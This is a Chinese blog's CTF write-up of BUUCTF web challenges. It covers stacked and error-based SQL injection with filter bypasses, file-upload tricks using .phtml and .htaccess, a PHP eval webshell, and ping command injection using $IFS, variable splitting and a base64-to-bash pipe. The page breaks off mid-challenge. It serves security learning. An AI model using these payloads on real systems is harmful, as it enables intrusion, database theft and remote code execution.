<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>BUUCTF | 仙心</title><meta name="author" content="xianxin"><meta name="copyright" content="xianxin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[强网杯 2019]随便注首先用引号是否要闭合判断是字符型，同时发现#被过滤，所以选用–+，尝试常规的注入流程发现select被过滤，大小写绕过也不行. return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);  于是尝试堆叠注入是否可行。 &#x3D;1’;show databases">
<meta property="og:type" content="article">
<meta property="og:title" content="BUUCTF">
<meta property="og:url" content="https://xianxinyyds.github.io/2025/01/28/BUU/index.html">
<meta property="og:site_name" content="仙心">
<meta property="og:description" content="[强网杯 2019]随便注首先用引号是否要闭合判断是字符型，同时发现#被过滤，所以选用–+，尝试常规的注入流程发现select被过滤，大小写绕过也不行. return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);  于是尝试堆叠注入是否可行。 &#x3D;1’;show databases">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xianxinyyds.github.io/img/xianxin.jpg">
<meta property="article:published_time" content="2025-01-28T15:20:58.000Z">
<meta property="article:modified_time" content="2025-08-30T09:15:29.384Z">
<meta property="article:author" content="xianxin">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xianxinyyds.github.io/img/xianxin.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "BUUCTF",
  "url": "https://xianxinyyds.github.io/2025/01/28/BUU/",
  "image": "https://xianxinyyds.github.io/img/xianxin.jpg",
  "datePublished": "2025-01-28T15:20:58.000Z",
  "dateModified": "2025-08-30T09:15:29.384Z",
  "author": [
    {
      "@type": "Person",
      "name": "xianxin",
      "url": "https://xianxinyyds.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/xianxin.jpg"><link rel="canonical" href="https://xianxinyyds.github.io/2025/01/28/BUU/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'BUUCTF',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/456.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/xianxin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/147.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/xianxin.jpg" alt="Logo"><span class="site-name">仙心</span></a><a class="nav-page-title" href="/"><span class="site-name">BUUCTF</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-28T15:20:58.000Z" title="发表于 2025-01-28 23:20:58">2025-01-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-30T09:15:29.384Z" title="更新于 2025-08-30 17:15:29">2025-08-30</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">25.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>107分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><h2 id="首先用引号是否要闭合判断是字符型，同时发现-被过滤，所以选用–-，尝试常规的注入流程发现select被过滤，大小写绕过也不行"><a href="#首先用引号是否要闭合判断是字符型，同时发现-被过滤，所以选用–-，尝试常规的注入流程发现select被过滤，大小写绕过也不行" class="headerlink" title="首先用引号是否要闭合判断是字符型，同时发现#被过滤，所以选用–+，尝试常规的注入流程发现select被过滤，大小写绕过也不行."></a>首先用引号是否要闭合判断是字符型，同时发现#被过滤，所以选用–+，尝试常规的注入流程发现select被过滤，大小写绕过也不行.</h2><blockquote>
<p>return preg_match(“&#x2F;select|update|delete|drop|insert|where|.&#x2F;i”,$inject);</p>
</blockquote>
<h2 id="于是尝试堆叠注入是否可行。"><a href="#于是尝试堆叠注入是否可行。" class="headerlink" title="于是尝试堆叠注入是否可行。"></a>于是尝试堆叠注入是否可行。</h2><blockquote>
<p>&#x3D;1’;show databases –+</p>
</blockquote>
<h2 id="发现可行，于是继续爆表名。"><a href="#发现可行，于是继续爆表名。" class="headerlink" title="发现可行，于是继续爆表名。"></a>发现可行，于是继续爆表名。</h2><blockquote>
<p>&#x3D;1’;show tables –+</p>
</blockquote>
<h2 id="爆出两个表”1919810931114514”和”words”，于是尝试爆列名"><a href="#爆出两个表”1919810931114514”和”words”，于是尝试爆列名" class="headerlink" title="爆出两个表”1919810931114514”和”words”，于是尝试爆列名."></a>爆出两个表”1919810931114514”和”words”，于是尝试爆列名.</h2><blockquote>
<p>&#x3D;1’;show columns from 反引号1919810931114514反引号 –+<br>(这里要注意纯数字作为表名要加反引号&#96;&#96;)</p>
</blockquote>
<h2 id="爆出flag的数据名，尝试脱库，因为select被过滤，所以尝试handler命令进行脱库。"><a href="#爆出flag的数据名，尝试脱库，因为select被过滤，所以尝试handler命令进行脱库。" class="headerlink" title="爆出flag的数据名，尝试脱库，因为select被过滤，所以尝试handler命令进行脱库。"></a>爆出flag的数据名，尝试脱库，因为select被过滤，所以尝试handler命令进行脱库。</h2><blockquote>
<p>handler命令是mysql专有的一个查询表数据的函数，但是不如select功能强大。<br>基本语法：handler table_name OPEN 打开表<br>handler  table_name read first 读表的第一行<br>handler table_name read next 读下一行<br>handler table_name close 关闭表</p>
</blockquote>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><blockquote>
<p>&#x3D;1’;handler 反引号1919810931114514反引号 open;handler 反引号1919810931114514反引号 read first –+</p>
</blockquote>
<p><img src="https://pics.lwzheng.tech/2024/12/19/6763dbf380fb0.png" alt="图片1" title="WP1"></p>
<h2 id="得到flag"><a href="#得到flag" class="headerlink" title="得到flag"></a>得到flag</h2><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p><img src="https://pics.lwzheng.tech/2024/12/19/6763dfc8a8c3b.png" alt="图片1" title="WP1"></p>
<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><h2 id="先试了试常规注入，发现几乎一直有“可别被我逮到了”，说明很多关键词都被过滤了，所以用BP加上sql关键词字典进行fuzz（模糊测试），判断有哪些关键词被过滤"><a href="#先试了试常规注入，发现几乎一直有“可别被我逮到了”，说明很多关键词都被过滤了，所以用BP加上sql关键词字典进行fuzz（模糊测试），判断有哪些关键词被过滤" class="headerlink" title="先试了试常规注入，发现几乎一直有“可别被我逮到了”，说明很多关键词都被过滤了，所以用BP加上sql关键词字典进行fuzz（模糊测试），判断有哪些关键词被过滤"></a>先试了试常规注入，发现几乎一直有“可别被我逮到了”，说明很多关键词都被过滤了，所以用BP加上sql关键词字典进行fuzz（模糊测试），判断有哪些关键词被过滤</h2><p><img src="https://pics.lwzheng.tech/2024/12/19/6763e06878589.png" alt="240e4b7ebb80294876b2b553b7d66c09.png" title="WP1"></p>
<h2 id="fuzz之后发现报错注入剩了一个漏网之鱼extractvalue，报错也有回显，所以就用报错注入了，同时空格也被严重过滤，常规绕过都难以绕过，所以直接靠（）来进行空格代替-和–-也被过滤，但是-可以用-23代替，and也被过滤，但是or没有被过滤，构造payload。"><a href="#fuzz之后发现报错注入剩了一个漏网之鱼extractvalue，报错也有回显，所以就用报错注入了，同时空格也被严重过滤，常规绕过都难以绕过，所以直接靠（）来进行空格代替-和–-也被过滤，但是-可以用-23代替，and也被过滤，但是or没有被过滤，构造payload。" class="headerlink" title="fuzz之后发现报错注入剩了一个漏网之鱼extractvalue，报错也有回显，所以就用报错注入了，同时空格也被严重过滤，常规绕过都难以绕过，所以直接靠（）来进行空格代替,#和–+也被过滤，但是#可以用%23代替，and也被过滤，但是or没有被过滤，构造payload。"></a>fuzz之后发现报错注入剩了一个漏网之鱼extractvalue，报错也有回显，所以就用报错注入了，同时空格也被严重过滤，常规绕过都难以绕过，所以直接靠（）来进行空格代替,#和–+也被过滤，但是#可以用%23代替，and也被过滤，但是or没有被过滤，构造payload。</h2><blockquote>
<p><a target="_blank" rel="noopener" href="http://ea81c265-1481-437e-845b-3f0582d2a9d1.node5.buuoj.cn:81/check.php?username=a&password=1%27or(updatexml(1,concat(0x7e,database(),0x7e),1))%23">http://ea81c265-1481-437e-845b-3f0582d2a9d1.node5.buuoj.cn:81/check.php?username=a&amp;password=1&#39;or(updatexml(1,concat(0x7e,database(),0x7e),1))%23</a></p>
</blockquote>
<h2 id="得到geek的数据库名"><a href="#得到geek的数据库名" class="headerlink" title="得到geek的数据库名"></a>得到geek的数据库名</h2><blockquote>
<p><a target="_blank" rel="noopener" href="http://ea81c265-1481-437e-845b-3f0582d2a9d1.node5.buuoj.cn:81/check.php?username=a&password=1%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(%27geek%27))),0x7e),1)%23">http://ea81c265-1481-437e-845b-3f0582d2a9d1.node5.buuoj.cn:81/check.php?username=a&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),0x7e),1)%23</a></p>
</blockquote>
<h2 id="得到H4rDsq1的表名"><a href="#得到H4rDsq1的表名" class="headerlink" title="得到H4rDsq1的表名"></a>得到H4rDsq1的表名</h2><blockquote>
<p><a target="_blank" rel="noopener" href="http://ea81c265-1481-437e-845b-3f0582d2a9d1.node5.buuoj.cn:81/check.php?username=a&password=1%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27))),0x7e),1)%23">http://ea81c265-1481-437e-845b-3f0582d2a9d1.node5.buuoj.cn:81/check.php?username=a&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))),0x7e),1)%23</a></p>
</blockquote>
<h2 id="得到id-username-password的列名"><a href="#得到id-username-password的列名" class="headerlink" title="得到id,username,password的列名"></a>得到id,username,password的列名</h2><blockquote>
<p><a target="_blank" rel="noopener" href="http://ea81c265-1481-437e-845b-3f0582d2a9d1.node5.buuoj.cn:81/check.php?username=a&password=1%27or(updatexml(1,concat(0x7e,(select(concat(id,username,password))from(H4rDsq1)),0x7e),1))%23">http://ea81c265-1481-437e-845b-3f0582d2a9d1.node5.buuoj.cn:81/check.php?username=a&amp;password=1&#39;or(updatexml(1,concat(0x7e,(select(concat(id,username,password))from(H4rDsq1)),0x7e),1))%23</a></p>
</blockquote>
<p><img src="https://pics.lwzheng.tech/2024/12/19/6763e66006e4f.png" alt="8eaf517c-15ba-4013-8ced-d71f9ceab027.png"></p>
<h2 id="发现超过报错回显最大字符数，同时substr也被过滤了，所以考虑使用right（数据，长度）函数，功能为从右边读取一定长度的字符。"><a href="#发现超过报错回显最大字符数，同时substr也被过滤了，所以考虑使用right（数据，长度）函数，功能为从右边读取一定长度的字符。" class="headerlink" title="发现超过报错回显最大字符数，同时substr也被过滤了，所以考虑使用right（数据，长度）函数，功能为从右边读取一定长度的字符。"></a>发现超过报错回显最大字符数，同时substr也被过滤了，所以考虑使用right（数据，长度）函数，功能为从右边读取一定长度的字符。</h2><blockquote>
<p><a target="_blank" rel="noopener" href="http://ea81c265-1481-437e-845b-3f0582d2a9d1.node5.buuoj.cn:81/check.php?username=a&password=1%27or(updatexml(1,concat(0x7e,(select(right((password),30))from(H4rDsq1)),0x7e),1))%23">http://ea81c265-1481-437e-845b-3f0582d2a9d1.node5.buuoj.cn:81/check.php?username=a&amp;password=1%27or(updatexml(1,concat(0x7e,(select(right((password),30))from(H4rDsq1)),0x7e),1))%23</a></p>
</blockquote>
<p><img src="https://pics.lwzheng.tech/2024/12/19/6763e8130e833.png" alt="08403b28-c708-4fa2-a828-ce521a92c74c.png"></p>
<h2 id="最后拼接到一起就得到flag了"><a href="#最后拼接到一起就得到flag了" class="headerlink" title="最后拼接到一起就得到flag了"></a>最后拼接到一起就得到flag了</h2><h6 id="括号这么多太容易漏了，有一种debug的美（-）"><a href="#括号这么多太容易漏了，有一种debug的美（-）" class="headerlink" title="括号这么多太容易漏了，有一种debug的美（-_-）"></a>括号这么多太容易漏了，有一种debug的美（-_-）</h6><h1 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h1><h2 id="一开始没有思路，前端验证很好绕过，BP修改即可，但是后端应该是检测是否为-php后缀的很难绕过，-htaccess也因为上传后会随机生成文件名导致失效，其他方式也不好用。"><a href="#一开始没有思路，前端验证很好绕过，BP修改即可，但是后端应该是检测是否为-php后缀的很难绕过，-htaccess也因为上传后会随机生成文件名导致失效，其他方式也不好用。" class="headerlink" title="一开始没有思路，前端验证很好绕过，BP修改即可，但是后端应该是检测是否为.php后缀的很难绕过，.htaccess也因为上传后会随机生成文件名导致失效，其他方式也不好用。"></a>一开始没有思路，前端验证很好绕过，BP修改即可，但是后端应该是检测是否为.php后缀的很难绕过，.htaccess也因为上传后会随机生成文件名导致失效，其他方式也不好用。</h2><h2 id="了解到还有一种能运行php代码的文件后缀名-phtml之后就好做了，直接上传-png的一句话木马，BP抓包改成-phtml即可"><a href="#了解到还有一种能运行php代码的文件后缀名-phtml之后就好做了，直接上传-png的一句话木马，BP抓包改成-phtml即可" class="headerlink" title="了解到还有一种能运行php代码的文件后缀名.phtml之后就好做了，直接上传.png的一句话木马，BP抓包改成.phtml即可"></a>了解到还有一种能运行php代码的文件后缀名.phtml之后就好做了，直接上传.png的一句话木马，BP抓包改成.phtml即可</h2><p><img src="https://pics.lwzheng.tech/2024/12/19/67640ae683ab9.png" alt="0d0ac8bcfbece81db8997cd393db3ab9.png"></p>
<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><h2 id="这个题也是前后端都有验证，直接上传-php文件显示后缀名不能有ph，同时因为上传的文件不会随机生成文件名，所以可以用-htaccess解题，但是上传-jpg文件后后端验证一直过不去，看了源代码才知道原来是检测的文件内容里面是否有php标签，搜索了一下了解到可以用script类型标签，上传之后用-htaccess将jpg解析为php即可。"><a href="#这个题也是前后端都有验证，直接上传-php文件显示后缀名不能有ph，同时因为上传的文件不会随机生成文件名，所以可以用-htaccess解题，但是上传-jpg文件后后端验证一直过不去，看了源代码才知道原来是检测的文件内容里面是否有php标签，搜索了一下了解到可以用script类型标签，上传之后用-htaccess将jpg解析为php即可。" class="headerlink" title="这个题也是前后端都有验证，直接上传.php文件显示后缀名不能有ph，同时因为上传的文件不会随机生成文件名，所以可以用.htaccess解题，但是上传.jpg文件后后端验证一直过不去，看了源代码才知道原来是检测的文件内容里面是否有php标签，搜索了一下了解到可以用script类型标签，上传之后用.htaccess将jpg解析为php即可。"></a>这个题也是前后端都有验证，直接上传.php文件显示后缀名不能有ph，同时因为上传的文件不会随机生成文件名，所以可以用.htaccess解题，但是上传.jpg文件后后端验证一直过不去，看了源代码才知道原来是检测的文件内容里面是否有php标签，搜索了一下了解到可以用script类型标签，上传之后用.htaccess将jpg解析为php即可。</h2><blockquote>
<p>《script language&#x3D;’php’》@eval($_POST[‘a’]);《&#x2F;script》</p>
</blockquote>
<h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><h2 id="看到ping，知道大概率是在ping一个地址的同时用；或者-进行命令执行，所以先试试ls命令"><a href="#看到ping，知道大概率是在ping一个地址的同时用；或者-进行命令执行，所以先试试ls命令" class="headerlink" title="看到ping，知道大概率是在ping一个地址的同时用；或者||进行命令执行，所以先试试ls命令"></a>看到ping，知道大概率是在ping一个地址的同时用；或者||进行命令执行，所以先试试ls命令</h2><blockquote>
<p>?ip&#x3D;127.0.0.1;ls</p>
</blockquote>
<p><img src="https://pics.lwzheng.tech/2024/12/22/67681b60d695a.png" alt="193a408b-8f62-4a29-9c01-44073eea7977.png"></p>
<h2 id="看到flag-php，当场就想直接cat拿到flag，但是显示符号被过滤，判断为空格"><a href="#看到flag-php，当场就想直接cat拿到flag，但是显示符号被过滤，判断为空格" class="headerlink" title="看到flag.php，当场就想直接cat拿到flag，但是显示符号被过滤，判断为空格"></a>看到flag.php，当场就想直接cat拿到flag，但是显示符号被过滤，判断为空格</h2><blockquote>
<p>Linux 下绕过空格限制<br><code>$</code>IFS &#x2F;&#x2F;Internal Field Separator （内部字段分隔符）默认为（空格、制表符、换号）。<br><code>$``&#123;IFS&#125;</code><br><code>$</code>IFS<code>$</code>1 &#x2F;&#x2F;改成<code>$</code>[1,2,3,4,5,6,7,8,9]<br>&lt;<br>&lt;&gt;<br><code>&#123;cat,flag.php&#125;</code>  &#x2F;&#x2F;用逗号实现了空格功能<br>%20<br>%09<br><code>$</code>‘\x20’</p>
</blockquote>
<h2 id="这里尝试之后发现大部分都被过滤，但是-IFS-1还能用，所以尝试cat-IFS-1flag-php，发现显示flag被过滤"><a href="#这里尝试之后发现大部分都被过滤，但是-IFS-1还能用，所以尝试cat-IFS-1flag-php，发现显示flag被过滤" class="headerlink" title="这里尝试之后发现大部分都被过滤，但是$IFS$1还能用，所以尝试cat$IFS$1flag.php，发现显示flag被过滤"></a>这里尝试之后发现大部分都被过滤，但是<code>$</code>IFS<code>$</code>1还能用，所以尝试cat<code>$</code>IFS<code>$</code>1flag.php，发现显示flag被过滤</h2><blockquote>
<p>过滤关键字<br>a&#x3D;g;b&#x3D;fla<code>$</code>a.php;cat$IFS$1$b  &#x2F;&#x2F;赋值引用<br>ca\t fl\ag.php	&#x2F;&#x2F;不影响命令执行<br>cat f*.php		&#x2F;&#x2F;匹配关键字<br>echo  “Y2F0IGZsYWcucGhw” | base64 -d | bash  &#x2F;&#x2F;cat flag.php的base64编码通过管道执行<br>cat &#96;ls&#96;&#96; &#x2F;&#x2F;ls出来的文件名都会被cat</p>
</blockquote>
<h2 id="尝试之后判断第一种应该可以用的，但是直接-a-fl-b-ag-cat-IFS-1-a-b-php依然显示flag被过滤，无法理解，于是先去欺负欺负软柿子index-php-直接cat-IFS-1index-php拿下"><a href="#尝试之后判断第一种应该可以用的，但是直接-a-fl-b-ag-cat-IFS-1-a-b-php依然显示flag被过滤，无法理解，于是先去欺负欺负软柿子index-php-直接cat-IFS-1index-php拿下" class="headerlink" title="尝试之后判断第一种应该可以用的，但是直接;a&#x3D;fl;b&#x3D;ag;cat$IFS$1$a$b.php依然显示flag被过滤，无法理解，于是先去欺负欺负软柿子index.php,直接cat$IFS$1index.php拿下"></a>尝试之后判断第一种应该可以用的，但是直接;a&#x3D;fl;b&#x3D;ag;cat<code>$</code>IFS<code>$</code>1<code>$</code>a<code>$</code>b.php依然显示flag被过滤，无法理解，于是先去欺负欺负软柿子index.php,直接<code>cat</code>$<code>IFS</code>$<code>1index.php</code>拿下</h2><p><img src="https://pics.lwzheng.tech/2024/12/22/67681d7257613.png" alt="1e52b9e0-f7d7-4469-8875-5fe1fd04ab04.png"></p>
<h2 id="看了源代码才知道过滤flag的方式是按顺序判断有没有flag，中间可以用字符隔开，这样就防止fla-g等绕过方法，只要把flag的顺序打乱再赋值就不会被检测到了，构造payload"><a href="#看了源代码才知道过滤flag的方式是按顺序判断有没有flag，中间可以用字符隔开，这样就防止fla-g等绕过方法，只要把flag的顺序打乱再赋值就不会被检测到了，构造payload" class="headerlink" title="看了源代码才知道过滤flag的方式是按顺序判断有没有flag，中间可以用字符隔开，这样就防止fla\g等绕过方法，只要把flag的顺序打乱再赋值就不会被检测到了，构造payload"></a>看了源代码才知道过滤flag的方式是按顺序判断有没有flag，中间可以用字符隔开，这样就防止fla\g等绕过方法，只要把flag的顺序打乱再赋值就不会被检测到了，构造payload</h2><blockquote>
<p>?ip&#x3D;127.0.0.1;a&#x3D;ag;b&#x3D;fl;cat<code>$</code>IFS<code>$</code>1<code>$</code>b<code>$</code>a.php</p>
</blockquote>
<h2 id="flag在源码里"><a href="#flag在源码里" class="headerlink" title="flag在源码里"></a>flag在源码里</h2><p><img src="https://pics.lwzheng.tech/2024/12/22/67681ea22bd57.png" alt="cf872247aa9709366a3f4c0fe4f2c435.png"></p>
<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><h2 id="首先从网页源代码中看见“Oh-You-found-me”，并且前面有一个可以跳转的链接，点进去，进入下一关。"><a href="#首先从网页源代码中看见“Oh-You-found-me”，并且前面有一个可以跳转的链接，点进去，进入下一关。" class="headerlink" title="首先从网页源代码中看见“Oh! You found me”，并且前面有一个可以跳转的链接，点进去，进入下一关。"></a>首先从网页源代码中看见“Oh! You found me”，并且前面有一个可以跳转的链接，点进去，进入下一关。</h2><h2 id="跳转之后的网页中间有一个secret按钮，按了之后显示“没看清么？回去再仔细看看吧。”，判断为重定向类型，去BP抓包，果然是302重定向型网页，里面有一个“secr3t-php”，访问进入下一关。"><a href="#跳转之后的网页中间有一个secret按钮，按了之后显示“没看清么？回去再仔细看看吧。”，判断为重定向类型，去BP抓包，果然是302重定向型网页，里面有一个“secr3t-php”，访问进入下一关。" class="headerlink" title="跳转之后的网页中间有一个secret按钮，按了之后显示“没看清么？回去再仔细看看吧。”，判断为重定向类型，去BP抓包，果然是302重定向型网页，里面有一个“secr3t.php”，访问进入下一关。"></a>跳转之后的网页中间有一个secret按钮，按了之后显示“没看清么？回去再仔细看看吧。”，判断为重定向类型，去BP抓包，果然是302重定向型网页，里面有一个“secr3t.php”，访问进入下一关。</h2><h2 id="下一关直接给了源代码，源代码里面有include函数，并且说了flag在flag-php中，所以判断为用-filter读取源代码，构造-file-php-filter-read-convert-base64-encode-resource-flag-php-这里base编码是为了把注释也读取出来，不然直接读取源代码看不到注释-，读取出来解码即可。"><a 